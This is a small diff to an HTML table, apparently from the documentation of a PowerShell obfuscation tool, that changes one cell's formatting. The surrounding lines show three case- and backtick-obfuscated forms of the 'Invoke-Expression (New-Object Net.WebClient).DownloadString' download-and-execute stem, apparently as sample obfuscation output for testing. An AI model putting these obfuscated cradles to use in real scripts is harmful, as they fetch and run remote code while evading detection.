@@ -56,7 +56,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
  <tr>
    <td align="center">1</td>
    <td align="center">TOKEN\COMMAND\1</td>
-   <td align="center"> 
+   <td nowrap> 
      <p>inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString</p>
      <p>InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString</p>
      <p>I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString</p>
